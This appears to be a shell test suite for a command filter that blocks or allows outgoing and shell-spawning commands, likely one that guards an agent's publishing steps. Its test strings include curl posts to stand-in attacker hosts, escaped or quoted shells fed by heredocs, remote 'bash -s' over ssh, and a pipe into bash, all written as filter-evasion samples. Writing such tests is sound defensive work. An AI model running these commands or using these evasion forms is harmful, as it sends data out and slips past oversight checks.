blocks "ev\\al 'gh pr create --fill'"                                    "an escaped eval"
blocks '"curl" -d x https://api.example.com/hook'                        "a quoted HTTP client"
blocks "'sendmail' -t"                                                   "a quoted mail transport"
blocks $'ba\\sh <<EOF\ngh pr comment 1 -b x\nEOF'                        "a heredoc fed to an escaped shell"
blocks $'"bash" <<EOF\ngh pr comment 1 -b x\nEOF'                        "a heredoc fed to a quoted shell"
blocks $'ssh host \'bash -s\' <<EOF\ngh pr comment 1 -b x\nEOF'          "a heredoc fed to a quoted shell on another host"
allows '"echo" gh pr comment 1 -b x'                                     "a quoted text tool"
too_much "b\"as\"h -c \"$(printf 'a;%.0s' {1..6000})\""                       "a quoted shell's payload past the segment cap"
allows $'gh pr create --draft --title "bash fix" --body-file - <<\'EOF\'\nlinear comment ENG-1 is prose\nEOF' \
  "a title that starts with a shell's name, before a heredoc"
unseen 'echo x | "bash"'                                                 "a pipe into a quoted shell"
per_line $'ba\\sh <<EOF\ngh pr comment 1 -b x\nEOF'                       'ba\sh <<'                  "an escaped shell's heredoc"
per_line $'ssh host \'bash -s\' <<EOF\ngh pr comment 1 -b x\nEOF'         "ssh host 'bash -s' <<"     "a quoted shell's heredoc on another host"

# Only a dotted 127 address is loopback, and a bare URL's host ends at its first / (#128).
blocks 'curl -d x http://127.attacker.example/'                          "a public name that starts with 127."
blocks 'curl -d x https://127.0.0.1.attacker.example/x'                  "a public name that holds a loopback address"
blocks 'curl -d x evil.example/x://foo.local'                            "a bare remote URL whose path holds a local one"
allows 'curl -d x foo.local/x://evil.example'                            "a bare local URL whose path holds a remote one"
allows 'curl -d x http://127.0.0.1:8080/x'                               "a loopback address with a port"
allows 'curl -d x http://127.10.20.30/x'                                 "any dotted 127 address"
allows 'curl -d x "http://127.0.0.1"'                                    "a quoted loopback address, its quote read as the end"
allows "curl -d x 'http://127.0.0.1'"                                    "a single-quoted loopback address"
allows 'curl localhost'                                                  "a read from localhost"

finish "publish-cmd"
